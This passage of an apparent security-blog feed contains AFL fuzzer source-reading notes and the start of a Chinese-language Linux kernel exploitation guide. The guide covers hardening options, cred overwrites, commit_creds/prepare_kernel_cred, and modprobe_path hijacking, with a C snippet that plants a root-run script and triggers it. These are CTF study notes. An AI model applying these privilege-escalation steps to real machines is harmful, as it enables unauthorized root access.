class="number">4</span> ... <span class="number">7</span>:</span><br><span class="line">    perf_score *= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">8</span> ... <span class="number">13</span>:</span><br><span class="line">    perf_score *= <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">14</span> ... <span class="number">25</span>:</span><br><span class="line">    perf_score *= <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    perf_score *= <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that we don&#x27;t go over limit. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (perf_score &gt; HAVOC_MAX_MULT * <span class="number">100</span>)</span><br><span class="line">    perf_score = HAVOC_MAX_MULT * <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> perf_score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="common-fuzz-stuff-一个testcase的运行">common_fuzz_stuff | 一个testcase的运行</h3><p>在fuzz过程中，用来通知fork_server运行一次测试，并且保存有效的种子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST u8 <span class="title function_">common_fuzz_stuff</span><span class="params">(<span class="type">char</span> **argv, u8 *out_buf, u32 len)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  u8 fault;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (post_handler)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    out_buf = post_handler(out_buf, &amp;len);</span><br><span class="line">    <span class="comment">// 此handler通常是afl_processers</span></span><br><span class="line">    <span class="keyword">if</span> (!out_buf || !len)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  write_to_testcase(out_buf, len);</span><br><span class="line">  <span class="comment">// 保存此testcase</span></span><br><span class="line">  fault = run_target(argv, exec_tmout);</span><br><span class="line">  <span class="comment">// 运行一次测试</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回1说明需要快速终止</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fault == FAULT_TMOUT)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (subseq_tmouts++ &gt; TMOUT_LIMIT)</span><br><span class="line">    &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    subseq_tmouts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Users can hit us with SIGUSR1 to request the current input</span></span><br><span class="line"><span class="comment">     to be abandoned. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_requested)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    skip_requested = <span class="number">0</span>;</span><br><span class="line">    cur_skipped_paths++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This handles FAULT_ERROR for us: */</span></span><br><span class="line"></span><br><span class="line">  queued_discovered += save_if_interesting(argv, out_buf, len, fault);</span><br><span class="line">  <span class="comment">// 如果存在interesting 的种子，保存起来</span></span><br><span class="line">  <span class="keyword">if</span> (!(stage_cur % stats_update_freq) || stage_cur + <span class="number">1</span> == stage_max)</span><br><span class="line">    show_stats();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;overview&quot;&gt;overview&lt;/h1&gt;
&lt;p&gt;对于AFL代码的重新阅读，笔者之前曾经阅读过一次AFL代码，但是比较粗糙，所以决定重新阅读一遍，理解其中比较细节的部分。&lt;/p&gt;
&lt;p&gt;首先简单介绍一下AFL，AFL是一个覆盖率引导的fuzz 工具。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Fuzz" scheme="https://v3rdant.cn/categories/Fuzz/"/>
    
    
    <category term="Fuzz" scheme="https://v3rdant.cn/tags/Fuzz/"/>
    
    <category term="Coding" scheme="https://v3rdant.cn/tags/Coding/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.Linux-Kernel-Pwn-All-in-One</title>
    <link href="https://v3rdant.cn/Pwn.Linux-Kernel-Pwn-All-in-One/"/>
    <id>https://v3rdant.cn/Pwn.Linux-Kernel-Pwn-All-in-One/</id>
    <published>2024-01-11T08:10:33.000Z</published>
    <updated>2024-03-03T08:21:36.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="overview">overview</h1><p>笔者厌倦了用户态堆的种种tricks，于是决定进入kernel pwn的大坑😊</p><h1 id="安全机制">安全机制</h1><p><strong>CONFIG_CFI_CLANG=y</strong></p><p>控制流完整性校验，限制ROP</p><p><strong>CONFIG_SLAB_FREELIST_HARDENED=y</strong></p><p>类似于用户态下 glibc 中的 safe-linking 机制，在内核中的 slab/slub 分配器当中也存在着类似的机制保护着 freelist—— <code>SLAB_FREELIST_HARDENED</code>：</p><p>类似于 glibc 2.32 版本引入的保护，在开启这种保护之前，slub 中的 free object 的 next 指针直接存放着 next free object 的地址，攻击者可以通过读取 freelist 泄露出内核线性映射区的地址，在开启了该保护之后 free object 的 next 指针存放的是由以下三个值进行异或操作后的值：</p><ul><li>当前 free object 的地址</li><li>下一个 free object 的地址</li><li>由 kmem_cache 指定的一个 random 值</li></ul><p><strong>CONFIG_HARDENED_USERCOPY=y</strong></p><p>hardened usercopy 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，<strong>主要检查拷贝过程中对内核空间中数据的读写是否会越界</strong>：</p><ul><li>读取的数据长度是否超出源 object 范围</li><li>写入的数据长度是否超出目的 object 范围</li></ul><p>不过这种保护 <em>不适用于内核空间内的数据拷贝</em> ，这也是目前主流的绕过手段</p><p>这一保护被用于 <code>copy_to_user()</code> 与 <code>copy_from_user()</code> 等数据交换 API 中</p><p><strong>CONFIG_SLAB_FREELIST_RANDOM=y</strong></p><p>这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object 之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object 的地址</p><p>需要注意的是这种保护发生在<strong>slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO</strong></p><p><strong>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</strong></p><p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），<strong>会将被分配的内存上的内容进行清零</strong>，从而防止了利用未初始化内存进行数据泄露的情况</p><p><strong>CONFIG_RANDOMIZE_KSTACK_OFFSET</strong></p><p>决定内核栈是否存在随机偏移</p><p><strong>CONFIG_MEMCG_KMEM</strong></p><p>决定<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是否会从同样的 <code>kmalloc-xx</code> 中进行分配</p><p><strong>CONFIG_CFI_CLANG</strong></p><p>决定是否开启CFI(控制流完整性)， 限制了ROP</p><p><strong>CONFIG_STATIC_USERMODEHELPER</strong></p><p>决定modprobe_path 是否可写</p><h1 id="信息搜集">信息搜集</h1><ol><li>查看内核版本</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><ol start="2"><li>检查各种基础保护</li></ol><ul><li>启动脚本<ul><li>pti=on</li><li>smep,smap</li><li>kaslr</li></ul></li><li>.config</li><li>检查分配方式</li></ul><h1 id="Target">Target</h1><p>以下部分来自 ctf-wiki, 笔者会添加一些自己的理解。</p><h2 id="modify-cred">modify cred</h2><p>内核pwn的大部分目标都是实现提权，而一个进程的权限是由其对应的cred结构体决定的，因此。</p><p>kernel通过task_struct 中的cred的指针来索引cred结构体，<br>更进一步地，通过cred的结构体来识别当前user，因此可以通过修改当前cred结构体或者task_struct的指针来达成提权的效果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="直接定位cred">直接定位cred</h3><p>当拥有内存读写的能力后，可以通过在内存中搜索magic 来查找cred结构体。</p><p>// 笔者尝试搜索后，发现不知道为什么，有些cred结构体，magic字段为空 #TODO</p><p>笔者给出另一个cred定位方法，在内核态下， GS 段 存储着进程相关控制信息，在其固定偏移，可以找到当前cred结构体的指针。</p><p>当然，显然大部分情况，是基本不可能找到恰好访问gs目标偏移地址的gadget的，因此这个方法并不是非常实用。</p><h3 id="commit-creds"><code>commit_creds</code></h3><p><code>commit_creds()</code> 函数被用以将一个新的 cred 设为当前进程 task_struct 的 real_cred 与 cred 字段，因此若是我们能够劫持内核执行流调用该函数并传入一个具有 root 权限的 cred，则能直接完成对当前进程的提权工作</p><p>// 笔者目前还没有看过<code>commit_creds()</code>的源代码，并不清楚对cred有哪些检查<br>// 在笔者看来，如果没有限制 传入的creds必须是相应 <code>slab_account</code> 的话，其实可以自己找一块内存区域来写</p><h4 id="prepare-kernel-cred"><code>prepare_kernel_cred()</code></h4><p>在内核当中提供了 <code>prepare_kernel_cred()</code> 函数用以拷贝指定进程的 cred 结构体，当我们传入的参数为 NULL 时，该函数会拷贝 <code>init_cred</code> 并返回一个有着 root 权限的 cred：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure><p>我们不难想到的是若是我们可以在内核空间中调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>，则也能直接完成提权的工作</p><p>不过自从内核版本 6.2 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，这使得这种提权方法无法再应用于 6.2 及更高版本的内核</p><h4 id="init-cred"><code>init_cred</code></h4><p>在内核初始化过程当中会以 root 权限启动 <code>init</code> 进程，其 cred 结构体为<strong>静态定义</strong>的 <code>init_cred</code>，由此不难想到的是我们可以通过 <code>commit_creds(&amp;init_cred)</code> 来完成提权的工作</p><p>// 一个问题是，在高版本，init_cred本身不再作为一个符号导出，因此你直接<br>// <code>kallsyms-finder</code> 是找不到相应地址的<br>// 一个直接的方法是，在相应版本linux源代码里面直接搜索符号引用<br>// 可以在内核代码段里面找到相应地址</p><p>// 这个方法不仅仅可以用于<code>init_cred</code>，一切内核data段的匿名结构体都可以通过这个方法查找， 除非内核在写的时候本身就没有直接访问</p><h2 id="modprobe-path">modprobe_path</h2><p>modprobe 是linux的一个用于执行不确定格式文件的一个机制，其会以root权限使用modprobe_path指向的解释器来实现相对应的程序，如果我们能够劫持相关的程序，就能以root权限执行一个程序，从而提权</p><ol><li>获取 modprobe_path 的地址。</li><li>修改 modprobe_path 为指定的程序。</li><li>触发执行 <code>call_modprobe</code>，从而实现提权 。这里我们可以利用以下几种方式来触发<ol><li>执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求（参考 call_usermodehelper 部分的介绍）。</li><li>使用未知协议来触发。</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1. modify modprobe_path to the target value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2. create related file</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown executable</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown protocol</span></span><br><span class="line">socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br></pre></td></tr></table></figure><p>在这个过程中，我们着重关注下如何定位 modprobe_path。</p><h5 id="直接定位">直接定位</h5><p>由于 modprobe_path 的取值是确定的，所以我们可以直接扫描内存，寻找对应的字符串。这需要我们具有扫描内存的能力。</p><h5 id="间接定位">间接定位</h5><p>考虑到 modprobe_path 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 modprobe_path 的地址。</p><h2 id="poweroff-cmd">poweroff_cmd</h2><p>类似于modprobe_path</p><ol><li>修改 poweroff_cmd 为指定的程序。</li><li>劫持控制流执行 <code>__orderly_poweroff</code>。</li></ol><p>关于如何定位 poweroff_cmd，我们可以采用类似于定位 <code>modprobe_path</code> 的方法。</p><h1 id="一些宏">一些宏</h1><p>以下列出了常用的一些宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_DMA0x01u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_HIGHMEM0x02u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_DMA320x04u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_MOVABLE0x08u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_RECLAIMABLE0x10u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_HIGH0x20u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_IO0x40u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_FS0x80u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_ZERO0x100u</span></span><br><span class="line"><span class="comment">/* 0x200u unused */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_DIRECT_RECLAIM0x400u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_KSWAPD_RECLAIM0x800u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_WRITE0x1000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOWARN0x2000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_RETRY_MAYFAIL0x4000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOFAIL0x8000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NORETRY0x10000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_MEMALLOC0x20000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_COMP0x40000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOMEMALLOC0x80000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_HARDWALL0x100000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_THISNODE0x200000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_ACCOUNT0x400000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_ZEROTAGS0x800000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN_HW_TAGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_SKIP_ZERO0x1000000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_SKIP_KASAN0x2000000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_SKIP_ZERO0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_SKIP_KASAN0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOLOCKDEP0x4000000u</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___GFP_NOLOCKDEP0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_DMA((__force gfp_t)___GFP_DMA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_HIGHMEM((__force gfp_t)___GFP_HIGHMEM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_DMA32((__force gfp_t)___GFP_DMA32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_MOVABLE((__force gfp_t)___GFP_MOVABLE)  <span class="comment">/* ZONE_MOVABLE allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_ZONEMASK(__GFP_DMA|__GFP_HIGHMEM|__GFP_DMA32|__GFP_MOVABLE)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_RECLAIMABLE ((__force gfp_t)___GFP_RECLAIMABLE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_WRITE((__force gfp_t)___GFP_WRITE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_HARDWALL   ((__force gfp_t)___GFP_HARDWALL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_THISNODE((__force gfp_t)___GFP_THISNODE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_ACCOUNT((__force gfp_t)___GFP_ACCOUNT)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_HIGH((__force gfp_t)___GFP_HIGH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_MEMALLOC((__force gfp_t)___GFP_MEMALLOC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_NOMEMALLOC ((__force gfp_t)___GFP_NOMEMALLOC)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_IO((__force gfp_t)___GFP_IO)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_FS((__force gfp_t)___GFP_FS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_DIRECT_RECLAIM((__force gfp_t)___GFP_DIRECT_RECLAIM) <span class="comment">/* Caller can reclaim */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_KSWAPD_RECLAIM((__force gfp_t)___GFP_KSWAPD_RECLAIM) <span class="comment">/* kswapd can wake */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_RECLAIM ((__force gfp_t)(___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_RETRY_MAYFAIL((__force gfp_t)___GFP_RETRY_MAYFAIL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_NOFAIL((__force gfp_t)___GFP_NOFAIL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_NORETRY((__force gfp_t)___GFP_NORETRY)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_NOWARN ((__force gfp_t)___GFP_NOWARN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_COMP ((__force gfp_t)___GFP_COMP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_ZERO ((__force gfp_t)___GFP_ZERO)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_ZEROTAGS ((__force gfp_t)___GFP_ZEROTAGS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_SKIP_ZERO ((__force gfp_t)___GFP_SKIP_ZERO)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_SKIP_KASAN ((__force gfp_t)___GFP_SKIP_KASAN)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Disable lockdep for GFP context tracking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_NOLOCKDEP ((__force gfp_t)___GFP_NOLOCKDEP)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Room for N __GFP_FOO bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_BITS_SHIFT (26 + IS_ENABLED(CONFIG_LOCKDEP))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GFP_BITS_MASK ((__force gfp_t)((1 &lt;&lt; __GFP_BITS_SHIFT) - 1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_ATOMIC (__GFP_HIGH | __GFP_KSWAPD_RECLAIM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_KERNEL (__GFP_RECLAIM | __GFP_IO | __GFP_FS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_KERNEL_ACCOUNT (GFP_KERNEL | __GFP_ACCOUNT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_NOWAIT (__GFP_KSWAPD_RECLAIM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_NOIO (__GFP_RECLAIM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_NOFS (__GFP_RECLAIM | __GFP_IO)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_USER (__GFP_RECLAIM | __GFP_IO | __GFP_FS | __GFP_HARDWALL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_DMA __GFP_DMA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_DMA32 